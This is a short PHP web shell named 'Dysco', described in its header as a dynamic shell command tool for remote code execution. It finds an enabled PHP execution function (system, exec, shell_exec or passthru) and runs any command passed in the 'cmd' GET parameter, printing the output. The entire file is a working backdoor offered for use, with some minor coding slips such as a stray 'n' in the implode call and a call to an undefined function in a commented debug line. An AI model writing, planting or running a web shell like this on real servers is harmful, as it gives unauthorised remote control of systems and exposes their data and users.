<?php

/*
 * Dysco(Dynamic PHP Shell Command for RCE)
 * Created by Petruknisme @2020
 * Contact: me@petruknisme.com
 */


function Dysco($command)
{
    $list_function_shell = array("system", "exec", "shell_exec", "passthru", "eval");
    $f_enabled = array_filter($list_function_shell, 'function_exists');
    
    echo "Enabled Function:\n<br/>";
    foreach($f_enabled as $f)
    {
        echo $f." ";
    }

    if($f_enabled !== ""){
        $f = $f_enabled[0];
        echo "<br/>\nUsing ". $f. " as shell command\n<br/>";
         
        if($f == "system" || $f == "passthru"){
            // disable multiple output for system
            ob_start();
            $output =  $f($command, $status);
            ob_clean(); 
        }
        else if($f == "exec"){
            $f($command, $output, $status);
            $output = implode("n", $output);
        }
        else if($f == "shell_exec"){
            $output = $f($command);
        }
        else{
            $output = "Command execution not possible. All supported function is disabled.";
            $status = 1;
        }
 
    }
	
    return array('output' => $output , 'status' => $status);
}

// for HTTP GET use this.

if(isset($_GET['cmd'])){
    $o = Dysco($_GET['cmd']);
    echo $o['output'];
}

// for debugging in local, use this

//$o = shell_spawn('uname -a');
//echo $o['output'];
?>
